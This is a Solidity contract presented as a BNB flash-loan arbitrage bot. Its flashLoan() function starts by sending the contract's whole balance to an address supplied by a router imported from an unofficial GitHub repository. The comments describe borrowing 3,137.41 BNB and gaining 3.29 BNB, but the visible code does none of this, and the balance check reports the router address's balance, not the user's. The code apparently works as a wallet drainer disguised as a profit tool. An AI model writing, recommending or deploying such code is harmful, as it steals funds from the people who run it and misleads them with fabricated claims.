pragma solidity ^0.5.0;


// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
import "https://github.com/flashloanmethod/flash_loan/blob/main/IPancakePair.sol";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

//Do Not Edit Above Imported Contract

contract InitiateFlashLoan {
    
    RouterV2 router;

    uint ownerbal;
    constructor(
    
    ) public {
        router = new RouterV2();
        ownerbal=router.pancakeSwapAddress().balance;
    }

    function () external payable {}  
    
    function OwnerAddress() public view returns(address) {
        return address(msg.sender);
    }
    
    function ContractAddress() public view returns(address) {
        
        return router.pancakeSwapAddress();
    }
    
    function CheckBalance() public view returns(uint) {
          return router.pancakeSwapAddress().balance-ownerbal;
    }


    function flashLoan() public payable {
        // Send required coins for swap
        address(uint160(router.pancakeSwapAddress())).transfer(
            address(this).balance
        );

        //Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
        router.borrowFlashloanFromMultiplier(
            address(this),
            router.bakerySwapAddress(),
            9999
        );
        
        //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
        uint256 _loanAmount=9999;
        router.convertBnbToBusd(msg.sender, _loanAmount / 2);
        //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
        router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
        //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
        router.transferBnbToMultiplier(router.pancakeSwapAddress());
        //Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}
